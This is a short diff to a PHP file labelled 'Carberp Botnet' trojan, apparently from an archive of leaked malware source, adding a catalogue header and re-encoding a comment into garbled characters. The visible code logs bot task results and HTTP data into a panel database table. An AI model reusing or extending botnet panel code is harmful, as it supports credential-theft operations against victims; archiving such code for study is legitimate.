@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 <?php
 
 require($dir['site'] . '/classes/curl.class.php');
@@ -247,7 +258,7 @@ if($http->status == 301 && !empty($http->webpage)){
         			$mysqli->query('INSERT DELAYED INTO bf_panels_debug (type, msg, post_id) VALUES (\'5\', \''. json_encode(array($user[2], json_encode($http))) . '\', \''.$task->id.'\')');
         		}
         	}
-        	usleep(500000); // Спать 0.5 секунды
+        	usleep(500000); // пїЅпїЅпїЅпїЅпїЅ 0.5 пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
         }
     }else{
     	//$name_html = md5($link. time().mt_rand(100,99999));
